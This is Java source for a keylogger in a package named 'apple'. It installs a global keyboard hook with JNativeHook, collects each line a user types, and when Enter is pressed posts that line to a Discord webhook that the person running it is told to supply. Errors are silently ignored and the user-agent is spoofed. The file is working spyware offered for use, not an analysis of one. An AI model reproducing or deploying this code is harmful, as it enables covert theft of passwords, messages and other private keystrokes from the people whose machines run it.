package apple;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener
{
	private static final String WEBHOOK_URL = ""; // your discord webhook here
	private String message = "";
	
	public static void main (String [] args)
	{
		try { GlobalScreen.registerNativeHook(); } catch (NativeHookException e) { }
		GlobalScreen.addNativeKeyListener(new Main());
		
	}
	
	@Override
	public void nativeKeyTyped (NativeKeyEvent nativeEvent)
	{
		if (nativeEvent.getKeyChar() == '') //  is backspace
		{
			message = message.substring(0, message.length() - 1); // remove 1 letter from the message because the user pressed backspace
			
		}
		
		else
		{
			message += nativeEvent.getKeyChar();
			
		}
		
	}
	
	@Override
	public void nativeKeyPressed (NativeKeyEvent nativeEvent)
	{
		if (nativeEvent.getKeyCode() == 28) // the keycode 28 is enter
		{
			sendMessage(message);
			message = "";
			
		}
		
	}
	
	public void sendMessage (String message)
	{
        PrintWriter printWriter = null;
        BufferedReader bufferedReader = null;
        StringBuilder result = new StringBuilder();
        
        try
        {
            URL url = new URL(WEBHOOK_URL);
            URLConnection urlConnection = url.openConnection();
            urlConnection.setRequestProperty("accept", "*/*");
            urlConnection.setRequestProperty("connection", "Keep-Alive");
            urlConnection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            urlConnection.setDoOutput(true);
            urlConnection.setDoInput(true);
            printWriter = new PrintWriter(urlConnection.getOutputStream());
            printWriter.print(URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8"));
            printWriter.flush();
            bufferedReader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            String line;
            
            while ((line = bufferedReader.readLine()) != null) 
            {
                result.append("/n").append(line);
                
            }
            
        }
        
        catch (Exception e)
        {
        	
        	
        }
        
        finally
        {
        	if (printWriter != null)
            {
                printWriter.close();
                
            }
        	
        	try { if (bufferedReader != null)
            {
                bufferedReader.close();
                
            }} catch (Exception e) { }
            
        }
        
    }
	
}
